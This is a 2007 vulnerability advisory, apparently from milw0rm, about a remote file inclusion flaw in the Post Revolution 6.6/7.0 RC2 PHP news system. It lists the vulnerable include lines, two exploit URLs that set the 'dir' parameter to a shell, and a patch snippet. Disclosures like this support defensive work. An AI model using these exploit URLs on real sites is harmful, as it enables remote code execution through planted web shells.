@@ -1,0 +1,100 @@
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                         Post Revolution Remote File Inclusion
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                         Affected Software .: Post Revolution 6.6 / 7.0 Release Candidate 2
+                         Download..: http://www.fabio.com.ar/postrev/
+                         Risk ..............: high
+                         Date .........: 25/3/2007
+                         Found by ..........: InyeXion
+                         Contact ...........: InyeXion[at]gmail.com
+                         Web .............: Www.InyeXion.com.ar
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    Affected File:
+/common.php
+/themes/default/preview_post_completo.php
+
+ Vulnerable Code:
+
+/common.php
+
+Line [10]       include ($dir."themes/".$config_data["template"]."/encabezado.php");
+Line [16]       include ($dir."themes/".$config_data["template"]."/cuerpo.php");
+Line [22]       include ($dir."themes/".$config_data["template"]."/pie.php");
+Line [37]       include ($dir."themes/".$config_data["template"]."/menu_principal.php");
+Line [49]       include ($dir."themes/".$config_data["template"]."/error.php");
+Line [129]      include ($dir."themes/".$config_data["template"]."/login_form.php");
+Line [135]      include ($dir."themes/".$config_data["template"]."/logout.php");
+Line [174]      include ($dir."language/".$config_data["lang"].".php");
+Line [272]      include ($dir."language/".$config_data["lang"].".php");
+Line [282]      include ($dir."themes/".$config_data["template"]."/seccion.php");
+Line [360]      include ($dir."language/".$config_data["lang"].".php");
+Line [446]      include ($dir."themes/".$config_data["template"]."/post.php");
+Line [460]      include ($dir."language/".$config_data["lang"].".php");
+Line [543]      include ($dir."themes/".$config_data["template"]."/archivo_noticias.php");
+Line [549]      include ($dir."themes/".$config_data["template"]."/cuerpo_archivo.php");
+Line [570]      include ($dir."language/".$config_data["lang"].".php");
+Line [628]      include ($dir."themes/".$config_data["template"]."/post_completo.php");
+Line [641]      include ($dir."language/".$config_data["lang"].".php");
+Line [661]      include ($dir."language/".$config_data["lang"].".php");
+Line [680]      include ($dir."themes/".$config_data["template"]."/posts_usuario.php");
+Line [692]      include ($dir."language/".$config_data["lang"].".php");
+Line [715]      include ($dir."themes/".$config_data["template"]."/comment_encabezado.php");
+Line [750]      include ($dir."themes/".$config_data["template"]."/comment.php");
+Line [770]      include ($dir."themes/".$config_data["template"]."/comment_form.php");
+Line [776]      include ($dir."themes/".$config_data["template"]."/info.php");
+Line [782]      include ($dir."themes/".$config_data["template"]."/info.php");
+Line [1054]     include ($dir."language/".$config_data["lang"].".php");
+Line [1106]     include ($dir."themes/".$config_data["template"]."/encuesta_head.php");
+Line [1124]     include ($dir."themes/".$config_data["template"]."/encuesta_opc.php");
+Line [1128]     include ($dir."themes/".$config_data["template"]."/encuesta_pie.php");
+Line [1159]     include ($dir."themes/".$config_data["template"]."/encuesta_head_ver.php");
+Line [1180]     include ($dir."themes/".$config_data["template"]."/encuesta_opc_ver.php");
+Line [1183]     include ($dir."themes/".$config_data["template"]."/encuesta_pie_ver.php");
+Line [1231]     include ($dir."themes/".$config_data["template"]."/encuestas_anteriores.php");
+Line [1242]     include ($dir."themes/".$config_data["template"]."/tagmenu.php");
+Line [1297]     include ($dir."themes/".$config_data["template"]."/tagpost.php");
+Line [1310]     include ($dir."language/".$config_data["lang"].".php");
+Line [1482]     include ($dir."language/".$config_data["lang"].".php");
+Line [1506]     include ($dir."themes/".$config_data["template"]."/categoria_enlace.php");
+Line [1521]     include ($dir."themes/".$config_data["template"]."/enlacefila.php");
+Line [1570]     include ($dir."config.php");
+Line [1676]     include ($dir."language/".$config_data["lang"].".php");
+Line [1678]     include ($dir."themes/".$config_data["template"]."/buscar.php");
+Line [1685]     include ($dir."language/".$config_data["lang"].".php");
+Line [1723]     include ($dir."themes/".$config_data["template"]."/resultado.php");
+Line [1730]     include ($dir."language/".$config_data["lang"].".php");
+Line [1766]     include ($dir."themes/".$config_data["template"]."/busq-dato.php");
+Line [1772]     include ($dir."themes/".$config_data["template"]."/busq-resultado.php");
+Line [1778]     include ($dir."themes/".$config_data["template"]."/busq-resultado.php");
+Line [1790]     include ($dir."language/".$config_data["lang"].".php");
+Line [1813]     include ($dir."themes/".$config_data["template"]."/categoria_descarga.php");
+Line [1834]     include ($dir."themes/".$config_data["template"]."/descargafila.php");
+Line [1875]     include ($dir."language/".$config_data["lang"].".php");
+Line [1892]     include ($dir."language/".$config_data["lang"].".php");
+Line [1908]     include ($dir."language/".$config_data["lang"].".php");
+Line [1924]     include ($dir."language/".$config_data["lang"].".php");
+Line [2061]     include ($dir."include/anti-spam.php");
+
+
+/themes/default/preview_post_completo.php
+
+Line [3]                include ($dir."themes/".$config_data["template"]."/post_completo.php");
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Exploit:
+
+http://[target]/common.php?dir=Shell
+http://[target]/themes/default/preview_post_completo.php?dir=Shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Fixed bug:
+
+/common.php and /themes/default/preview_post_completo.php insert
+
+if((isset($_REQUEST['dir'])  || isset($_GET['dir']) || isset($_POST['dir'])) && !defined("dir")){
+die("Fixed bug by InyeXion.");
+ }
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# milw0rm.com [2007-04-23]
